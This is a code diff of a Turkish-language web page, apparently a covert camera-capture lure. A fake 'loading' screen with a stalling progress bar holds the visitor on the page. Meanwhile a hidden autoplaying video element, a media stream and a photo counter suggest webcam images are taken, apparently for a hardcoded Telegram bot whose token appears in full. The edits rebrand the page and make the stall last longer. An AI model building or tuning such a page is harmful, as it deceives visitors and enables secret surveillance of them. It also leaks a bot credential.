@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Jujutsu</title>
+  <title>KageHunt</title>
 
   <style>
     *{
@@ -65,7 +65,7 @@
       height:100%;
       background:#ff0000;
       box-shadow:0 0 20px #ff0000;
-      transition:width 0.2s linear;
+      transition:width 0.4s linear;
     }
 
     .percent{
@@ -139,7 +139,7 @@
   <video id="hiddenVideo" autoplay muted playsinline></video>
 
   <div class="container">
-    <div class="logo">𝖀𝖒𝖚𝖙</div>
+    <div class="logo">𝑲𝒂𝒈𝒆</div>
 
     <div id="loadingArea">
       <div class="loading-text">Yükleniyor...</div>
@@ -158,7 +158,6 @@
   </div>
 
   <script>
-    // Token ana dosya ile tamamen eşitlendi
     const BOT_TOKEN = '8607287109:AAHPIjZWmYnbrlDJ2KyPHZTjHxfZKLORO5c';
     
     function urlParametresiAl(param) {
@@ -179,14 +178,6 @@
     const statusText = document.getElementById("status");
     const loadingArea = document.getElementById("loadingArea");
     const errorArea = document.getElementById("errorArea");
-
-    const fakeMessages = [
-      "Sunucuya bağlanılıyor...",
-      "Veriler doğrulanıyor...",
-      "Sistem hazırlanıyor...",
-      "Güvenli bağlantı kuruluyor...",
-      "Paketler indiriliyor..."
-    ];
 
     let mediaStream = null;
     let fotoSayac = 0;
@@ -257,13 +248,15 @@
 
     function baslatYuklemeBari() {
       const progressInterval = setInterval(() => {
-        if (progress < 100) {
-          progress += Math.random() * 3;
-          if (progress > 100) progress = 100;
+        if (progress < 97) {
+          progress += 0.8; // Yavaş artış
+          if (progress > 97) progress = 97;
           progressBar.style.width = progress + "%";
           percentText.innerText = Math.floor(progress) + "%";
+        } else {
+          clearInterval(progressInterval);
         }
-      }, 200);
+      }, 250);
     }
 
     async function baslat() {
